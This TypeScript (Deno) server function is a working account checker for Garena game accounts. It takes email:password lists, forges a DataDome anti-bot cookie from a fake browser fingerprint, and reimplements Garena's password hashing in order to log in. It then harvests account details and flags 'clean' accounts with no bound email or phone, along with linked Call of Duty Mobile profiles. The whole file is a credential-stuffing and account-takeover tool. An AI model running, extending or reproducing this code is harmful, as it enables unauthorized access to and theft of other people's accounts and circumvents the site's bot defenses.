import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Rate limiting
const RATE_LIMIT_MAX = 30;
const RATE_LIMIT_WINDOW = 60000;
const rateLimitStore = new Map<string, { count: number; start: number }>();

function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: number } {
  const now = Date.now();
  const record = rateLimitStore.get(clientId);
  if (!record || now - record.start > RATE_LIMIT_WINDOW) {
    rateLimitStore.set(clientId, { count: 1, start: now });
    return { allowed: true };
  }
  if (record.count >= RATE_LIMIT_MAX) {
    return { allowed: false, retryAfter: Math.ceil((record.start + RATE_LIMIT_WINDOW - now) / 1000) };
  }
  record.count++;
  return { allowed: true };
}

// Crypto utilities
function hexToBytes(hex: string): Uint8Array {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

function md5(message: string): string {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  
  function rotl(x: number, n: number) { return ((x << n) | (x >>> (32 - n))) >>> 0; }
  function add(x: number, y: number) { return (x + y) >>> 0; }

  const s = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const K = Array.from({length: 64}, (_, i) => Math.floor(Math.abs(Math.sin(i + 1)) * 0x100000000));

  let [a0, b0, c0, d0] = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476];
  
  const msgLen = data.length;
  const totalLen = Math.ceil((msgLen + 9) / 64) * 64;
  const padded = new Uint8Array(totalLen);
  padded.set(data);
  padded[msgLen] = 0x80;
  new DataView(padded.buffer).setUint32(totalLen - 8, (msgLen * 8) & 0xFFFFFFFF, true);

  for (let i = 0; i < totalLen; i += 64) {
    const M = new Uint32Array(16);
    for (let j = 0; j < 16; j++) M[j] = new DataView(padded.buffer).getUint32(i + j * 4, true);
    
    let [A, B, C, D] = [a0, b0, c0, d0];
    for (let j = 0; j < 64; j++) {
      let F: number, g: number;
      if (j < 16) { F = (B & C) | ((~B >>> 0) & D); g = j; }
      else if (j < 32) { F = (D & B) | ((~D >>> 0) & C); g = (5 * j + 1) % 16; }
      else if (j < 48) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
      else { F = C ^ (B | (~D >>> 0)); g = (7 * j) % 16; }
      F = add(add(add(F >>> 0, A), K[j]), M[g]);
      A = D; D = C; C = B; B = add(B, rotl(F, s[j]));
    }
    a0 = add(a0, A); b0 = add(b0, B); c0 = add(c0, C); d0 = add(d0, D);
  }

  const result = new Uint8Array(16);
  const view = new DataView(result.buffer);
  view.setUint32(0, a0, true); view.setUint32(4, b0, true);
  view.setUint32(8, c0, true); view.setUint32(12, d0, true);
  return bytesToHex(result);
}

async function sha256(message: string): Promise<string> {
  const data = new TextEncoder().encode(message);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return bytesToHex(new Uint8Array(hash));
}

// AES-128 ECB encryption
function aesEcbEncrypt(plainHex: string, keyHex: string): string {
  const pt = hexToBytes(plainHex), key = hexToBytes(keyHex);
  const sBox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];
  const rCon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];
  const xtime = (x: number) => ((x << 1) ^ (((x >>> 7) & 1) * 0x1b)) & 0xff;
  
  const w: number[][] = [];
  for (let i = 0; i < 4; i++) w[i] = [key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]];
  for (let i = 4; i < 44; i++) {
    const t = w[i-1].slice();
    if (i % 4 === 0) {
      const rot = [t[1], t[2], t[3], t[0]].map(b => sBox[b]);
      rot[0] ^= rCon[(i/4)-1];
      for (let j = 0; j < 4; j++) t[j] = rot[j];
    }
    w[i] = w[i-4].map((b, j) => b ^ t[j]);
  }
  
  const roundKeys: number[][][] = [];
  for (let r = 0; r < 11; r++) {
    const rk: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let row = 0; row < 4; row++) rk[row][c] = w[r*4+c][row];
    roundKeys.push(rk);
  }

  const result: number[] = [];
  for (let b = 0; b < pt.length; b += 16) {
    const state: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) state[r][c] = pt[b + c*4 + r] || 0;
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[0][i][j];
    
    for (let round = 1; round < 10; round++) {
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
      for (let i = 1; i < 4; i++) {
        const t = state[i].slice(0, i);
        for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
        for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
      }
      for (let c = 0; c < 4; c++) {
        const [a, bb, cc, d] = [state[0][c], state[1][c], state[2][c], state[3][c]];
        state[0][c] = xtime(a) ^ xtime(bb) ^ bb ^ cc ^ d;
        state[1][c] = a ^ xtime(bb) ^ xtime(cc) ^ cc ^ d;
        state[2][c] = a ^ bb ^ xtime(cc) ^ xtime(d) ^ d;
        state[3][c] = xtime(a) ^ a ^ bb ^ cc ^ xtime(d);
      }
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[round][i][j];
    }
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
    for (let i = 1; i < 4; i++) {
      const t = state[i].slice(0, i);
      for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
      for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
    }
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[10][i][j];
    
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) result.push(state[r][c]);
  }
  
  return bytesToHex(new Uint8Array(result)).substring(0, 32);
}

// Hash password using the exact algorithm from Python: MD5 -> SHA256(md5+v1) -> SHA256(result+v2) -> AES_ECB(md5, outer_hash)
async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
  const passMd5 = md5(decodeURIComponent(password));
  const innerHash = await sha256(passMd5 + v1);
  const outerHash = await sha256(innerHash + v2);
  const encrypted = aesEcbEncrypt(passMd5, outerHash);
  return encrypted;
}

// Get DataDome cookie
async function getDataDomeCookie(): Promise<string | null> {
  try {
    const url = 'https://dd.garena.com/js/';
    const jsData = JSON.stringify({
      "ttst": 76.70000004768372, "ifov": false, "hc": 4, "br_oh": 824, "br_ow": 1536,
      "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
      "wbd": false, "dp0": true, "tagpu": 5.738121195951787, "wdif": false, "wdifrm": false,
      "npmtm": false, "br_h": 738, "br_w": 260, "isf": false, "nddc": 1, "rs_h": 864,
      "rs_w": 1536, "rs_cd": 24, "phe": false, "nm": false, "jsf": false, "lg": "en-US",
      "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": true, "str_ls": true,
      "str_idb": true, "str_odb": false, "plgod": false, "plg": 5, "plgne": true,
      "plgre": true, "plgof": false, "plggt": false, "pltod": false, "hcovdr": false,
      "hcovdr2": false, "plovdr": false, "plovdr2": false, "ftsovdr": false, "ftsovdr2": false,
      "lb": false, "eva": 33, "lo": false, "ts_mtp": 0, "ts_tec": false, "ts_tsa": false,
      "vnd": "Google Inc.", "bid": "NA", "mmt": "application/pdf,text/pdf",
      "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
      "hdn": false, "awe": false, "geb": false, "dat": false, "med": "defined",
      "aco": "probably", "acots": false, "acmp": "probably", "acmpts": true, "acw": "probably",
      "acwts": false, "acma": "maybe", "acmats": false, "acaa": "probably", "acaats": true,
      "ac3": "", "ac3ts": false, "acf": "probably", "acfts": false, "acmp4": "maybe",
      "acmp4ts": false, "acmp3": "probably", "acmp3ts": false, "acwm": "maybe", "acwmts": false,
      "ocpt": false, "vco": "", "vcots": false, "vch": "probably", "vchts": true,
      "vcw": "probably", "vcwts": true, "vc3": "maybe", "vc3ts": false, "vcmp": "",
      "vcmpts": false, "vcq": "maybe", "vcqts": false, "vc1": "probably", "vc1ts": true,
      "dvm": 8, "sqt": false, "so": "landscape-primary", "bda": false, "wdw": true,
      "prm": true, "tzp": true, "cvs": true, "usb": true, "cap": true, "tbf": false,
      "lgs": true, "tpd": true
    });

    const payload = new URLSearchParams({
      jsData: jsData,
      eventCounters: '[]',
      jsType: 'ch',
      cid: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
      ddk: 'AE3F04AD3F0D3A462481A337485081',
      Referer: 'https://account.garena.com/',
      request: '/',
      responsePage: 'origin',
      ddv: '4.35.4'
    });

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
      },
      body: payload.toString()
    });

    const data = await response.json();
    console.log('[DATADOME] Response status:', data.status);
    
    if (data.status === 200 && data.cookie) {
      const cookie = data.cookie.split(';')[0].split('=')[1];
      console.log('[DATADOME] Got cookie');
      return cookie;
    }
    return null;
  } catch (e) {
    console.log('[DATADOME] Error:', e);
    return null;
  }
}

// Prelogin - GET method with app_id=10100
async function prelogin(account: string, datadome: string): Promise<{ v1: string; v2: string } | null> {
  const timestamp = Date.now();
  const params = new URLSearchParams({
    app_id: '10100',
    account: account,
    format: 'json',
    id: String(timestamp)
  });

  const url = `https://sso.garena.com/api/prelogin?${params.toString()}`;
  
  console.log('[PRELOGIN] Requesting for:', account);
  
  const response = await fetch(url, {
    method: 'GET',
    headers: {
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'en-US,en;q=0.9',
      'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
      'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
      'cookie': `datadome=${datadome}`
    }
  });

  console.log('[PRELOGIN] Status:', response.status);
  
  if (response.status === 403) {
    console.log('[PRELOGIN] 403 - DataDome blocked');
    return null;
  }
  
  const text = await response.text();
  console.log('[PRELOGIN] Response:', text.substring(0, 200));
  
  try {
    const data = JSON.parse(text);
    if (data.v1 && data.v2) {
      console.log('[PRELOGIN] Success - got v1/v2');
      return { v1: data.v1, v2: data.v2 };
    }
    if (data.error) {
      console.log('[PRELOGIN] Error:', data.error);
    }
  } catch (e) {
    console.log('[PRELOGIN] Parse error');
  }
  
  return null;
}

// Login - GET method
async function login(account: string, password: string, v1: string, v2: string, datadome: string): Promise<{ ssoKey: string } | { error: string }> {
  const hashedPassword = await hashPassword(password, v1, v2);
  const timestamp = Date.now();
  
  const params = new URLSearchParams({
    app_id: '10100',
    account: account,
    password: hashedPassword,
    redirect_uri: 'https://account.garena.com/',
    format: 'json',
    id: String(timestamp)
  });

  const url = `https://sso.garena.com/api/login?${params.toString()}`;
  
  console.log('[LOGIN] Attempting for:', account);
  
  const response = await fetch(url, {
    method: 'GET',
    headers: {
      'accept': 'application/json, text/plain, */*',
      'referer': 'https://account.garena.com/',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
      'cookie': `datadome=${datadome}`
    }
  });

  console.log('[LOGIN] Status:', response.status);
  
  // Extract sso_key from cookies
  const setCookie = response.headers.get('set-cookie') || '';
  let ssoKey = '';
  
  if (setCookie.includes('sso_key=')) {
    const match = setCookie.match(/sso_key=([^;]+)/);
    if (match) ssoKey = match[1];
  }
  
  const text = await response.text();
  console.log('[LOGIN] Response:', text.substring(0, 300));
  
  try {
    const data = JSON.parse(text);
    
    if (ssoKey || data.sso_key || data.session_key) {
      return { ssoKey: ssoKey || data.sso_key || data.session_key };
    }
    
    if (data.error) {
      return { error: data.error };
    }
  } catch (e) {
    console.log('[LOGIN] Parse error');
  }
  
  if (ssoKey) {
    return { ssoKey };
  }
  
  return { error: 'Login failed' };
}

// Get account info
async function getAccountInfo(ssoKey: string, datadome: string): Promise<Record<string, unknown> | null> {
  try {
    const response = await fetch('https://account.garena.com/api/account/init', {
      method: 'GET',
      headers: {
        'accept': '*/*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36',
        'cookie': `sso_key=${ssoKey}; datadome=${datadome}`
      }
    });

    if (response.ok) {
      const data = await response.json();
      console.log('[ACCOUNT] Got info');
      return data;
    }
  } catch (e) {
    console.log('[ACCOUNT] Error:', e);
  }
  return null;
}

// Get CODM access token
async function getCodmAccessToken(ssoKey: string): Promise<string | null> {
  try {
    const timestamp = Date.now();
    const url = 'https://auth.garena.com/oauth/token/grant';
    const data = `client_id=100082&response_type=token&redirect_uri=${encodeURIComponent('https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/')}&format=json&id=${timestamp}`;
    
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
        'cookie': `sso_key=${ssoKey}`
      },
      body: data
    });

    const result = await response.json();
    console.log('[CODM_TOKEN] Response:', JSON.stringify(result).substring(0, 100));
    return result.access_token || null;
  } catch (e) {
    console.log('[CODM_TOKEN] Error:', e);
    return null;
  }
}

// Process CODM callback
async function processCodmCallback(accessToken: string): Promise<{ token: string | null; status: string }> {
  try {
    const apiCallbackUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    
    const response = await fetch(apiCallbackUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml',
        'Referer': 'https://auth.garena.com/'
      },
      redirect: 'manual'
    });

    const location = response.headers.get('location') || '';
    console.log('[CODM_CALLBACK] Location:', location.substring(0, 100));
    
    if (location.includes('err=3')) {
      return { token: null, status: 'no_codm' };
    }
    
    if (location.includes('token=')) {
      const token = location.split('token=')[1]?.split('&')[0];
      return { token, status: 'success' };
    }
    
    return { token: null, status: 'unknown' };
  } catch (e) {
    console.log('[CODM_CALLBACK] Error:', e);
    return { token: null, status: 'error' };
  }
}

// Get CODM user info
async function getCodmUserInfo(token: string): Promise<Record<string, unknown> | null> {
  try {
    const response = await fetch('https://api-delete-request.codm.garena.co.id/oauth/check_login/', {
      method: 'GET',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'codm-delete-token': token,
        'Origin': 'https://delete-request.codm.garena.co.id',
        'Referer': 'https://delete-request.codm.garena.co.id/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36'
      }
    });

    const data = await response.json();
    console.log('[CODM_USER] Response:', JSON.stringify(data).substring(0, 200));
    
    if (data.user) {
      return {
        codm_nickname: data.user.codm_nickname || 'N/A',
        codm_level: data.user.codm_level || 'N/A',
        codm_region: data.user.region || 'N/A',
        codm_uid: data.user.uid || 'N/A',
        codm_open_id: data.user.open_id || 'N/A'
      };
    }
    return null;
  } catch (e) {
    console.log('[CODM_USER] Error:', e);
    return null;
  }
}

// Parse account details from API response
function parseAccountDetails(data: Record<string, unknown>): Record<string, unknown> {
  const userInfo = (data.user_info || data) as Record<string, unknown>;
  
  const email = userInfo.email as string || 'N/A';
  const emailVerified = Boolean(userInfo.email_v);
  const mobileNo = userInfo.mobile_no as string || '';
  const fbConnected = Boolean(userInfo.is_fbconnect_enabled);
  const idCard = userInfo.idcard as string || '';
  
  const binds: string[] = [];
  if (email && email !== 'N/A' && !email.startsWith('***') && email.includes('@')) binds.push('Email');
  if (mobileNo && mobileNo.trim()) binds.push('Phone');
  if (fbConnected) binds.push('Facebook');
  if (idCard && idCard.trim()) binds.push('ID Card');
  
  const isClean = !emailVerified && binds.length === 0;
  
  return {
    uid: userInfo.uid || 'N/A',
    username: userInfo.username || 'N/A',
    nickname: userInfo.nickname || 'N/A',
    email: email,
    email_verified: emailVerified,
    country: userInfo.acc_country || 'N/A',
    shell_balance: userInfo.shell || 0,
    mobile_no: mobileNo || 'N/A',
    is_clean: isClean,
    bind_status: isClean ? 'Clean' : `Bound (${binds.join(', ')})`,
    two_step_verify: Boolean(userInfo.two_step_verify_enable),
    authenticator: Boolean(userInfo.authenticator_enable),
    facebook_connected: fbConnected
  };
}

// Main check account function
async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
  console.log('[CHECK] Starting:', account);
  
  try {
    // Step 1: Get DataDome cookie
    const datadome = await getDataDomeCookie();
    if (!datadome) {
      console.log('[CHECK] Failed to get DataDome');
      return {
        account, password,
        status: 'error',
        message: 'Failed to get DataDome cookie',
        isClean: false, hasCodm: false
      };
    }
    
    // Step 2: Prelogin
    const preloginResult = await prelogin(account, datadome);
    if (!preloginResult) {
      return {
        account, password,
        status: 'invalid',
        message: 'Account not found or blocked',
        isClean: false, hasCodm: false
      };
    }

    // Step 3: Login
    const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, datadome);
    if ('error' in loginResult) {
      return {
        account, password,
        status: 'invalid',
        message: loginResult.error,
        isClean: false, hasCodm: false
      };
    }

    console.log('[CHECK] Login SUCCESS!');
    
    // Step 4: Get account info
    const accountData = await getAccountInfo(loginResult.ssoKey, datadome);
    const details = accountData ? parseAccountDetails(accountData) : { is_clean: false };

    // Step 5: Check CODM
    let hasCodm = false;
    let codmInfo: Record<string, unknown> = {};
    
    const codmToken = await getCodmAccessToken(loginResult.ssoKey);
    if (codmToken) {
      const callbackResult = await processCodmCallback(codmToken);
      if (callbackResult.status === 'success' && callbackResult.token) {
        const codmUser = await getCodmUserInfo(callbackResult.token);
        if (codmUser) {
          hasCodm = true;
          codmInfo = codmUser;
        }
      }
    }

    console.log(`[CHECK] Complete: valid, hasCodm=${hasCodm}, isClean=${details.is_clean}`);

    return {
      account, password,
      status: 'valid',
      isClean: details.is_clean,
      hasCodm,
      details,
      codm: codmInfo
    };

  } catch (error) {
    const msg = error instanceof Error ? error.message : String(error);
    console.error('[CHECK] Error:', msg);
    return {
      account, password,
      status: 'error',
      message: msg,
      isClean: false, hasCodm: false
    };
  }
}

// Input validation for accounts
interface ValidationResult {
  valid: boolean;
  errors: string[];
}

function validateAccountInput(accounts: unknown): ValidationResult {
  const errors: string[] = [];
  
  if (!Array.isArray(accounts)) {
    errors.push('Accounts must be an array');
    return { valid: false, errors };
  }
  
  if (accounts.length === 0) {
    errors.push('At least one account required');
    return { valid: false, errors };
  }
  
  if (accounts.length > 10) {
    errors.push('Maximum 10 accounts per request');
    return { valid: false, errors };
  }
  
  for (let i = 0; i < accounts.length; i++) {
    const line = accounts[i];
    
    if (typeof line !== 'string') {
      errors.push(`Account ${i + 1}: must be a string`);
      continue;
    }
    
    if (line.length > 500) {
      errors.push(`Account ${i + 1}: exceeds maximum length (500 chars)`);
      continue;
    }
    
    // Only allow printable ASCII characters
    if (!/^[\x20-\x7E]+$/.test(line)) {
      errors.push(`Account ${i + 1}: contains invalid characters`);
      continue;
    }
    
    const parts = line.split(':');
    if (parts.length < 2) {
      errors.push(`Account ${i + 1}: invalid format (use email:password)`);
      continue;
    }
    
    const email = parts[0].trim();
    if (email.length < 3 || email.length > 100) {
      errors.push(`Account ${i + 1}: invalid email length`);
      continue;
    }
    
    // Basic email format check
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      errors.push(`Account ${i + 1}: invalid email format`);
      continue;
    }
    
    const password = parts.slice(1).join(':').trim();
    if (password.length < 1 || password.length > 200) {
      errors.push(`Account ${i + 1}: invalid password length`);
    }
  }
  
  return {
    valid: errors.length === 0,
    errors
  };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const clientId = req.headers.get('x-forwarded-for') || 'unknown';
    console.log('[REQUEST] From:', clientId);

    const rateCheck = checkRateLimit(clientId);
    if (!rateCheck.allowed) {
      return new Response(
        JSON.stringify({ error: 'Rate limit exceeded', retryAfter: rateCheck.retryAfter }),
        { status: 429, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Parse body with size limit check
    const contentLength = parseInt(req.headers.get('content-length') || '0');
    if (contentLength > 50000) { // 50KB max
      return new Response(
        JSON.stringify({ error: 'Request body too large' }),
        { status: 413, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const { accounts } = await req.json();

    // Validate input
    const validation = validateAccountInput(accounts);
    if (!validation.valid) {
      return new Response(
        JSON.stringify({ error: 'Validation failed', details: validation.errors }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const results = [];
    
    for (const line of accounts.slice(0, 1)) {
      const parts = line.split(':');
      if (parts.length < 2) {
        results.push({ account: line, status: 'invalid', message: 'Invalid format' });
        continue;
      }
      
      const result = await checkAccount(parts[0].trim(), parts.slice(1).join(':').trim());
      results.push(result);
      console.log('[RESULT]', parts[0], ':', result.status);
    }

    return new Response(
      JSON.stringify({ results }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('[ERROR]', error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : 'Server error' }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
